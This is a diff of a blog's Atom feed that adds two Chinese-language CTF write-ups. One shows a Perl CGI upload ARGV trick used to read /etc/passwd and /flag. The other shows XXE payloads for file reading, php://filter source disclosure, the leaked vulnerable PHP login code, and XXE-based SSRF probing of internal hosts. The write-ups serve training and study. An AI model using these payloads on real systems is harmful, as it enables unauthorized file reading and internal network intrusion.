@@ -43,6 +43,9 @@
     <category term="xml_upload" />
     <category term="flask的session伪造" />
     <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
     <entry>
         <id>http://odiws.github.io/2025/02/09/BSidesCF2019-Sequel/</id>
         <title>[BSidesCF2019]Sequel</title>
@@ -458,6 +461,37 @@
         <category term="buuctf" />
         <category term="js" />
         <updated>2024-10-17T12:16:13.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/10/15/CSAWQual2016-i-got-id/</id>
+        <title>[CSAWQual2016]i_got_id</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/10/15/CSAWQual2016-i-got-id/"/>
+        <content type="html">&lt;h2 id=&#34;csawqual2016i_got_id&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csawqual2016i_got_id&#34;&gt;#&lt;/a&gt; [CSAWQual2016]i_got_id&lt;/h2&gt;
+&lt;p&gt;开局三个超链接：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/IGotIt/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;helloworld 提示 perl：&lt;/p&gt;
+&lt;p&gt;Forms 登陆页面，没有有用的信息，正常显示，无二次注入点，SQL 注入，ssti 都没有&lt;/p&gt;
+&lt;p&gt;就是 files 上传文件了，可以发现要上传 perl 文件：&lt;/p&gt;
+&lt;p&gt;直接猜测后端代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight perl&#34;&gt;&lt;figcaption data-lang=&#34;perl&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; strict&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; warnings&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; CGI&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$cgi&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; CGI&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;new&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$cgi&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;upload&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;file&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$cgi&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;param&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;file&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;$_&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;解释：&lt;/p&gt;
+&lt;p&gt;my $file= $cgi-&amp;gt;param( ‘file’ );：&lt;br&gt;
+param () 函数返回一个列表的文件。但是只有第一个文件会被放入 file 变量中。&lt;/p&gt;
+&lt;p&gt;while (&amp;lt;$file&amp;gt; ) 中，&amp;lt;&amp;gt; 不能处理字符串，除非是 ARGV，因此循环遍历并将每个值使用 open ()&lt;br&gt;
+ 调用。&lt;/p&gt;
+&lt;p&gt;对于读文件，如果传入一个 ARGV 的文件，那么 Perl 会将传入的参数作为文件名读出来。&lt;br&gt;
+所以，在上传的正常文件前加上一个文件上传项 ARGV，然后在 URL 中传入文件路径参数，就可以读取任意文件。&lt;/p&gt;
+&lt;p&gt;抓包：将里面的东西删除，复制 15，16 行空一行粘贴&lt;/p&gt;
+&lt;p&gt;第一个 ------- 删除 Content-Type，加的那个加上这个，在添加的地方前面加上 ARGV&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/IGotIt/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/IGotIt/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在 url 加上？cat+/etc/passwd (cat+/flag)(空格用 + 替代):&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/IGotIt/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后就出了：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/IGotIt/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：[CSAW 2016 I Got Id – Web200] i_got_id](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90c3VibG9ncy53b3JkcHJlc3MuY29tLzIwMTYvMDkvMTgvNjA2Lw==&#34;&gt;https://tsublogs.wordpress.com/2016/09/18/606/&lt;/span&gt;)&lt;/p&gt;
+</content>
+        <category term="buuctf，Perl后端文件上传" />
+        <updated>2024-10-15T06:15:57.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/</id>
@@ -1980,6 +2014,84 @@ while True:
 </content>
         <category term="buuctf" />
         <updated>2024-06-02T06:57:07.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/05/29/cookbook-1/</id>
+        <title>[nctf2019]truecookbook</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/05/29/cookbook-1/"/>
+        <content type="html">&lt;h2 id=&#34;nctf2019true-xml-cookbook&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nctf2019true-xml-cookbook&#34;&gt;#&lt;/a&gt; [NCTF2019]True XML cookbook&lt;/h2&gt;
+&lt;h3 id=&#34;xxe漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe漏洞&#34;&gt;#&lt;/a&gt; xxe 漏洞：&lt;/h3&gt;
+&lt;p&gt;与 Fake XML Cookbook 一样的类型，比 fake 难一些&lt;/p&gt;
+&lt;p&gt;Fake XML Cookbook：&lt;/p&gt;
+&lt;p&gt;这个是直接 xxe 漏洞：&lt;/p&gt;
+&lt;!DOCTYPE note [
+  &lt;!ENTITY admin SYSTEM &#34;file:///flag&#34;&gt;
+&lt;p&gt;]&amp;gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;admin;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个不能这样做：因为没有反应，反正是读文件&lt;/p&gt;
+&lt;p&gt;这个读不了读别的：php:filter/convert.base64-encode/resource=doLogin.php&lt;/p&gt;
+&lt;p&gt;获取源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;//doLogin.php
+&amp;lt;?php\n/**
+* autor: c0ny1\n* date: 2018-2-7
+*/
+
+$USERNAME = &#39;admin&#39;; //\xe8\xb4\xa6\xe5\x8f\xb7
+$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //\xe5\xaf\x86\xe7\xa0\x81
+$result = null;
+libxml_disable_entity_loader(false);   // libxml_disable_entity_loader用于禁用或启用加载外部实体的功能。禁用（TRUE）或启用（FALSE）。
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+try&amp;#123;
+	$dom = new DOMDocument();
+	$dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);   // loadXML() 方法通过解析一个 XML 标签字符串来组成该文档
+	$creds = simplexml_import_dom($dom);
+
+	$username = $creds-&amp;gt;username;
+	$password = $creds-&amp;gt;password;
+
+	if($username == $USERNAME &amp;amp;&amp;amp; $password == $PASSWORD)&amp;#123;
+		$result = sprintf(&amp;quot;&amp;lt;result&amp;gt;&amp;lt;code&amp;gt;%d&amp;lt;/code&amp;gt;&amp;lt;msg&amp;gt;%s&amp;lt;/msg&amp;gt;&amp;lt;/result&amp;gt;&amp;quot;,1,$username);
+	&amp;#125;else&amp;#123;       // sprintf() 函数把格式化的字符串写入变量中。
+		$result = sprintf(&amp;quot;&amp;lt;result&amp;gt;&amp;lt;code&amp;gt;%d&amp;lt;/code&amp;gt;&amp;lt;msg&amp;gt;%s&amp;lt;/msg&amp;gt;&amp;lt;/result&amp;gt;&amp;quot;,0,$username);
+	&amp;#125;	
+&amp;#125;catch(Exception $e)&amp;#123;
+	$result = sprintf(&amp;quot;&amp;lt;result&amp;gt;&amp;lt;code&amp;gt;%d&amp;lt;/code&amp;gt;&amp;lt;msg&amp;gt;%s&amp;lt;/msg&amp;gt;&amp;lt;/result&amp;gt;&amp;quot;,3,$e-&amp;gt;getMessage());
+&amp;#125;
+
+header(&#39;Content-Type: text/html; charset=utf-8&#39;);
+echo $result;
+?&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;simplexml_import_dom () 函数把 DOM 节点转换为 SimpleXMLElement 对象。获取 DOM 文档节点并转换为 SimpleXML 节点：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$dom=new domDocument;
+$dom-&amp;gt;loadXML(&amp;quot;&amp;lt;note&amp;gt;&amp;lt;to&amp;gt;Tove&amp;lt;/to&amp;gt;&amp;lt;from&amp;gt;Jani&amp;lt;/from&amp;gt;&amp;lt;/note&amp;gt;&amp;quot;);
+$x=simplexml_import_dom($dom);
+echo $x-&amp;gt;from;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;输出类似：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Jani
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;emm…… 没什么发现，但是读取源码的 payload 我还是在这里记录一哈。&lt;br&gt;
+这一次有所不同，上一题是我们读取文件得到 flag。这次是刺探存活的服务器；&lt;/p&gt;
+&lt;p&gt;其实很多人都小看了 xxe 漏洞，觉得它只可以读读文件啊什么的，其实大错特错，它还可以访问内网的主机，和 ssrf 利用的 dict 伪协议一样，都可以刺探存活的主机并且链接访问；也可以看作这个题是在打内网；&lt;/p&gt;
+&lt;p&gt;好的我们老样子，我们利用 ssrf 读内网文件。先用 file 协议读取相关的文件 /etc/passwd 和 /etc/hosts；当我们读取到 hosts 文件的时候，我们会发现有几个 ip 地址，我们便来访问一下，（到这里应该可以猜到是在打内网了）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;只能想到利用xxe进行ssrf打内网，扫描一下内网ip的几个文件：/etc/hosts，/proc/net/arp，/proc/net/fib_trie
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/2.png&#34; alt=&#34;2&#34;&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后就是找内网服务器了：读这个 http://173.113.242.10&lt;/p&gt;
+&lt;p&gt;没找到，还在报错&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;换个服务器&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE3My4xMTMuMjQyLjEx&#34;&gt;http://173.113.242.11&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获取 flag，完成啦&lt;/p&gt;
+</content>
+        <category term="buuctf，xxe漏洞" />
+        <updated>2024-05-29T13:46:38.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/05/28/buuctf5%E6%9C%8828%E6%97%A5/</id>
